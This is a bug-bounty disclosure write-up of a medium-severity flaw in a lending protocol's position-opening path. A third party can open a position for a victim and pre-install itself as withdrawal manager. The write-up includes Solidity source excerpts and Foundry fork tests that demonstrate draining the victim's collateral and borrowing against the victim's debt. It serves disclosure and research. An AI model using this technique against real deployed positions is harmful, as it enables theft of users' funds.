# Source-code-based

Project: Anonymous collateralized lending project (LEND-02)  
Category: Collateralized lending  
Severity: Medium — report-assigned, unadjudicated  
Engagement: Bug bounty hunting (competition submission)  
Chain: Ethereum asset fork; protocol contracts deployed locally by the proof  
Tech stack: Solidity/EVM, ERC-721 position ownership, ERC-20 collateral/debt tokens, Foundry, Chainlink, subgraph/TypeScript UI review  
Evidence: Historical local or fork test excerpts; scope and fixture assumptions are described below  
Remediation: Not independently verified  
Contribution: Research and disclosure case study; exclusive discovery credit is not asserted  
Proof availability: Excerpts and source references; the original harness and dependencies are not distributed.

# A third-party opener installs withdrawal authority on a victim-owned position

## Description

An attacker pays to open a new position owned by the victim and seeds itself as remove manager with an attacker receiver. The core opening path permits arbitrary owner and manager parameters. If the victim later adds collateral or leaves usable borrowing headroom before revoking the manager, the attacker withdraws collateral or borrows debt tokens to that receiver.

The attacker funds initial collateral and gas compensation; the victim must interact with the unfamiliar position or expose headroom. Existing victim positions cannot be overwritten because the ID includes the opener. Collateralization checks and owner-only manager changes remain enforced. The victim can revoke before exposure. Fork testing uses real collateral/price-feed dependencies but deploys the protocol locally, so it is not a proof against existing deployed protocol state. UI observations are dated source observations, not current frontend verification.

### Mechanism step by step

#### Step 1 — Install the chosen manager during a third-party open

The core path writes manager/receiver without requiring the designated owner to be the caller. Opening collateral comes from the caller and opening debt tokens also go to the caller.

Source: `bold/contracts/src/BorrowerOperations.sol:364-375`

```solidity

        // Set add/remove managers
        _setAddManager(vars.troveId, _addManager);
        _setRemoveManagerAndReceiver(vars.troveId, _removeManager, _receiver);

        vars.activePool.mintAggInterestAndAccountForTroveChange(_change, _interestBatchManager);

        // Pull coll tokens from sender and move them to the Active Pool
        _pullCollAndSendToActivePool(vars.activePool, _collAmount);

        // Mint the requested _boldAmount to the borrower and mint the gas comp to the GasPool
        vars.boldToken.mint(msg.sender, _boldAmount);
```

#### Step 2 — Authorize the seeded manager and route to its receiver

Later removals accept either the owner or the historical manager. When the manager acts, the historical receiver determines the destination.

Source: `bold/contracts/src/Dependencies/AddRemoveManagers.sol:107-121`

```solidity
    function _requireSenderIsOwnerOrRemoveManagerAndGetReceiver(uint256 _troveId, address _owner)
        internal
        view
        returns (address)
    {
        address manager = removeManagerReceiverOf[_troveId].manager;
        address receiver = removeManagerReceiverOf[_troveId].receiver;
        if (msg.sender != _owner && msg.sender != manager) {
            revert NotOwnerNorRemoveManager();
        }
        if (receiver == address(0) || msg.sender != manager) {
            return _owner;
        }
        return receiver;
    }
```

#### Step 3 — Preserve the victim revocation boundary

Post-open manager changes require the borrower. A victim who clears the manager before adding value blocks the attack; this is not arbitrary control over every position.

Source: `bold/contracts/src/Dependencies/AddRemoveManagers.sol:65-69`

```solidity
    function setRemoveManagerWithReceiver(uint256 _troveId, address _manager, address _receiver) public {
        _requireCallerIsBorrower(_troveId);
        _setRemoveManagerAndReceiver(_troveId, _manager, _receiver);
    }

```

## Proof of concept

The fork fixture creates attacker/victim identities, funds collateral and deploys the protocol against mainnet asset dependencies. One test has the victim add collateral after a third party seeded the remove-manager; the manager then transfers 1 WETH to its receiver. A second borrows 5,000 debt tokens to that receiver and raises the victim position’s debt by more than 5,000 after the fee. Controls check namespace separation, owner-only authority and successful revocation by the victim. The report records eight fork and six local tests.

**Proof limits:** Locally deployed protocol on an asset fork; victim continuation and unrevoked seeded authority are necessary.

The excerpts below preserve historical assertions and recorded outcomes; they are not a fresh execution result.

## Relevant test excerpts

Source: `bold/contracts/test/TroveThirdPartyManagerAbuseForkTest.t.sol:255-280`

```solidity
    function testFork_VictimAddsCollateralThenSeededManagerDrainsItToReceiver() public {
        uint256 troveId = _attackerOpenTroveForVictim(0, attacker, attackerReceiver);

        uint256 victimWethBefore = weth.balanceOf(victim);
        uint256 receiverWethBefore = weth.balanceOf(attackerReceiver);
        uint256 attackerWethBefore = weth.balanceOf(attacker);
        LatestTroveData memory troveBefore = troveManager.getLatestTroveData(troveId);

        vm.prank(victim);
        borrowerOperations.addColl(troveId, VICTIM_ADDED_COLL);

        LatestTroveData memory troveAfterVictimAdd = troveManager.getLatestTroveData(troveId);
        assertEq(weth.balanceOf(victim), victimWethBefore - VICTIM_ADDED_COLL, "victim WETH should fund addColl");
        assertEq(troveAfterVictimAdd.entireColl, troveBefore.entireColl + VICTIM_ADDED_COLL);
        assertEq(troveAfterVictimAdd.entireDebt, troveBefore.entireDebt, "addColl should not increase debt");

        vm.prank(attacker);
        borrowerOperations.withdrawColl(troveId, VICTIM_ADDED_COLL);

        LatestTroveData memory troveAfterDrain = troveManager.getLatestTroveData(troveId);
        assertEq(weth.balanceOf(attackerReceiver), receiverWethBefore + VICTIM_ADDED_COLL);
        assertEq(weth.balanceOf(attacker), attackerWethBefore, "manager caller should not receive WETH directly");
        assertEq(troveAfterDrain.entireColl, troveBefore.entireColl, "trove collateral returns to pre-victim level");
        assertEq(troveAfterDrain.entireDebt, troveBefore.entireDebt, "collateral drain should not alter debt");
    }

```

Source: `bold/contracts/test/TroveThirdPartyManagerAbuseForkTest.t.sol:282-302`

```solidity
        uint256 troveId = _attackerOpenTroveForVictim(0, attacker, attackerReceiver);

        uint256 receiverBoldBefore = boldToken.balanceOf(attackerReceiver);
        uint256 attackerBoldBefore = boldToken.balanceOf(attacker);
        LatestTroveData memory troveBefore = troveManager.getLatestTroveData(troveId);

        vm.prank(attacker);
        borrowerOperations.withdrawBold(troveId, ATTACKER_BORROW, type(uint256).max);

        LatestTroveData memory troveAfterBorrow = troveManager.getLatestTroveData(troveId);
        assertEq(boldToken.balanceOf(attackerReceiver), receiverBoldBefore + ATTACKER_BORROW);
        assertEq(boldToken.balanceOf(attacker), attackerBoldBefore, "manager caller should not receive BOLD directly");
        assertGt(
            troveAfterBorrow.entireDebt,
            troveBefore.entireDebt + ATTACKER_BORROW,
            "victim debt should include borrowed BOLD plus upfront fee"
        );
        assertEq(troveAfterBorrow.entireColl, troveBefore.entireColl, "borrow should not move collateral");
        assertEq(troveNFT.ownerOf(troveId), victim, "victim remains owner of debt-bearing trove");
    }

```
